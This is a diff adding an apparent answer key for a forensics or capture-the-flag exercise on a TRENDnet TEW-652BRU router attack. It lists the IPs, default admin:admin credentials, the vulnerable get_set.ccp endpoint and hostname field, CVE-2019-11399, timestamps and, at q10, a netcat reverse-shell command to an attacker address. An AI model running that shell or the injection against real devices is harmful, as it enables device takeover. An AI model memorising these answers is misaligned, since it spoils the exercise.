@@ -1,0 +1,11 @@
+q1: 192.168.10.1
+q2:TEW-652BRU_1.0b02
+q3:admin:admin
+q4:192.168.10.2
+q5:http://192.168.10.1/get_set.ccp
+q6:lanHostCfg_HostName_1.1.1.0
+q7:CVE-2019-11399
+q8:mkdir test
+q9:2025-01-22 14:37:59
+q10: ~/firmadyne/busybox nc 192.168.10.2 4444 -e /bin/sh
+q11:2025-01-22 14:42:25
